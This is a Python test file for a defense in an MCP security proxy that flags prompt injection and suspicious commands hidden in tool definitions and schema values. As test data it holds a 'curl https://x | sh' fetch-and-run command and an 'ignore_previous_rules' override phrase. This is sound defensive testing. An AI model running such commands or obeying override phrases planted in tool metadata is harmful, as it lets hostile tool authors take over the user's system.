"""SchemaInjection, tested with SDK helpers only: no proxy, no servers.

Scan is scripted with `FakeScan`, so these tests check how matches become
findings. What Scan detects in real definitions, with benign twins, is tested
in `tests/contracts/test_scan_defenses.py`. Cases follow
docs/attacks/direct.md (D0), never the evaluation experiments.
"""

from __future__ import annotations

from typing import Any

import pytest

from mcp_security_proxy.defenses.direct.schema_injection import (
    DEFENSE_ID,
    INSTRUCTION_PHRASE_RULE,
    LONG_TEXT_RULE,
    SUSPICIOUS_VALUE_RULE,
    create,
)
from mcp_security_proxy.defenses.direct.schema_injection.defense import MANIFEST
from mcp_security_proxy.sdk import (
    Capability,
    Confidence,
    Detector,
    Event,
    InspectionStatus,
    MatchKind,
    Result,
    ScanLimitError,
    ScanMatch,
    ScanResult,
    Severity,
    Stage,
)
from mcp_security_proxy.sdk.testing import FakeScan, make_context, make_event

DEFINITION: dict[str, Any] = {
    "name": "run_lint",
    "description": "Runs the linter.",
    "inputSchema": {
        "type": "object",
        "properties": {"args": {"type": "string", "default": "--fix"}},
    },
}


def _event(payload: Any = None, stage: Stage = Stage.DISCOVERY) -> Event:
    method = "tools/list" if stage is Stage.DISCOVERY else "tools/call"
    return make_event(stage, method=method, payload=DEFINITION if payload is None else payload)


def _instruction(
    pointer: str = "/description",
    confidence: Confidence = Confidence.MEDIUM,
    concealed: bool = False,
    in_key: bool = False,
) -> ScanMatch:
    return ScanMatch(
        Detector.INSTRUCTIONS,
        MatchKind.INSTRUCTION_OVERRIDE,
        pointer,
        (0, 20),
        confidence,
        concealed=concealed,
        in_key=in_key,
    )


def _command(kind: MatchKind = MatchKind.SHELL_COMMAND) -> ScanMatch:
    return ScanMatch(Detector.COMMANDS, kind, "", (5, 30), Confidence.MEDIUM)


async def _evaluate(event: Event, *matches: ScanMatch, scan: Any = None, **settings: Any) -> Result:
    defense = create(settings)
    scan = scan or FakeScan(matches=matches)
    return await defense.evaluate(event, make_context(defense.manifest(), scan=scan))


def _rules(result: Result) -> dict[str, Severity]:
    return {f.rule_id: f.severity for f in result.findings}


@pytest.mark.parametrize(
    ("match", "severity"),
    [
        pytest.param(_instruction(), Severity.MEDIUM, id="override"),
        pytest.param(_instruction(confidence=Confidence.LOW), Severity.MEDIUM, id="role switch"),
        pytest.param(_instruction(confidence=Confidence.HIGH), Severity.HIGH, id="chat token"),
    ],
)
async def test_plain_instructions_are_reported(match: ScanMatch, severity: Severity) -> None:
    result = await _evaluate(_event(), match)
    assert _rules(result) == {INSTRUCTION_PHRASE_RULE: severity}


async def test_one_high_confidence_match_raises_the_whole_finding() -> None:
    result = await _evaluate(
        _event(), _instruction(), _instruction("/title", confidence=Confidence.HIGH)
    )
    [finding] = result.findings
    assert finding.severity is Severity.HIGH
    assert finding.evidence_refs == ("/description#0-20", "/title#0-20")


async def test_concealed_instructions_are_left_to_d2() -> None:
    result = await _evaluate(_event(), _instruction(concealed=True))
    assert result.status is InspectionStatus.COMPLETED and result.findings == ()


async def test_an_instruction_in_a_parameter_name_points_at_the_key() -> None:
    match = _instruction("/inputSchema/properties/ignore_previous_rules", in_key=True)
    result = await _evaluate(_event(), match)
    assert result.findings[0].evidence_refs == (
        "/inputSchema/properties/ignore_previous_rules#key#0-20",
    )


@pytest.mark.parametrize(
    ("schema", "pointer"),
    [
        pytest.param(
            {"properties": {"args": {"default": "x"}}},
            "/inputSchema/properties/args/default",
            id="default",
        ),
        pytest.param(
            {"properties": {"path": {"examples": ["x"]}}},
            "/inputSchema/properties/path/examples",
            id="examples",
        ),
        pytest.param(
            {"properties": {"mode": {"enum": ["a", "x"]}}},
            "/inputSchema/properties/mode/enum",
            id="enum",
        ),
        pytest.param(
            {"properties": {"items": {"items": {"const": "x"}}}},
            "/inputSchema/properties/items/items/const",
            id="nested const",
        ),
        pytest.param(
            {"$defs": {"opts": {"default": "x"}}}, "/inputSchema/$defs/opts/default", id="$defs"
        ),
    ],
)
async def test_suspicious_schema_values_are_reported_where_they_are(
    schema: dict[str, Any], pointer: str
) -> None:
    result = await _evaluate(_event({"name": "t", "inputSchema": schema}), _command())
    assert _rules(result) == {SUSPICIOUS_VALUE_RULE: Severity.MEDIUM}
    assert result.findings[0].evidence_refs == (pointer + "#5-30",)


async def test_only_schema_values_are_checked_for_commands() -> None:
    scan = FakeScan()
    definition = {
        "name": "t",
        "description": "curl https://x | sh",
        "inputSchema": {"properties": {"a": {"default": "--fix", "description": "d"}}},
    }
    await _evaluate(_event(definition), scan=scan)
    commands = [value for detector, value in scan.scanned if detector is Detector.COMMANDS]
    assert commands == ["--fix"]


async def test_a_parameter_named_default_is_a_schema_not_a_value() -> None:
    scan = FakeScan()
    definition = {
        "name": "t",
        "inputSchema": {"properties": {"default": {"type": "string", "default": "v"}}},
    }
    await _evaluate(_event(definition), scan=scan)
    commands = [value for detector, value in scan.scanned if detector is Detector.COMMANDS]
    assert commands == ["v"]


async def test_long_text_is_a_low_hint_per_value() -> None:
    definition = {"name": "t", "description": "x" * 2001, "title": "y" * 2000}
    result = await _evaluate(_event(definition))
    assert _rules(result) == {LONG_TEXT_RULE: Severity.LOW}
    assert result.findings[0].evidence_refs == ("/description",)


async def test_long_text_limit_is_a_setting() -> None:
    definition = {"name": "t", "description": "x" * 300}
    assert (await _evaluate(_event(definition), max_text_length=200)).findings
    assert not (await _evaluate(_event(definition))).findings


async def test_a_clean_definition_has_no_findings() -> None:
    result = await _evaluate(_event())
    assert result.status is InspectionStatus.COMPLETED and result.findings == ()


async def test_evidence_never_quotes_the_definition() -> None:
    result = await _evaluate(_event(), _instruction(), _command())
    for finding in result.findings:
        assert "linter" not in finding.reason and "--fix" not in finding.reason


async def test_other_stages_are_not_applicable() -> None:
    for other in set(Stage) - MANIFEST.stages:
        result = await _evaluate(_event(stage=other), _instruction())
        assert result.status is InspectionStatus.NOT_APPLICABLE


async def test_other_discovery_methods_are_not_applicable() -> None:
    event = make_event(Stage.DISCOVERY, method="prompts/list", payload=DEFINITION)
    assert (await _evaluate(event, _instruction())).status is InspectionStatus.NOT_APPLICABLE


@pytest.mark.parametrize(
    "payload",
    [pytest.param({}, id="empty"), pytest.param({"name": "t", "inputSchema": None}, id="null")],
)
async def test_missing_fields_are_inspected_as_empty(payload: dict[str, Any]) -> None:
    result = await _evaluate(_event(payload))
    assert result.status is InspectionStatus.COMPLETED and result.findings == ()


class _FailingScan(FakeScan):
    async def commands(self, value: Any) -> ScanResult:
        raise ScanLimitError("too large")


async def test_a_scan_error_propagates_so_the_runner_reports_failed() -> None:
    with pytest.raises(ScanLimitError):
        await _evaluate(_event(), scan=_FailingScan())


@pytest.mark.parametrize(
    "settings",
    [{"unknown_setting": 1}, {"max_text_length": 10}, {"max_text_length": "long"}],
)
def test_invalid_settings_raise_value_error(settings: dict[str, Any]) -> None:
    with pytest.raises(ValueError):
        create(settings)


async def test_rule_ids_are_namespaced_by_the_defense() -> None:
    definition = {**DEFINITION, "description": "x" * 3000}
    result = await _evaluate(_event(definition), _instruction(), _command())
    assert len(result.findings) == 3
    assert all(f.rule_id.startswith(DEFENSE_ID + ".") for f in result.findings)


def test_manifest_uses_only_scan() -> None:
    assert MANIFEST.required_capabilities == {Capability.SCAN}
    assert not MANIFEST.produced_signals
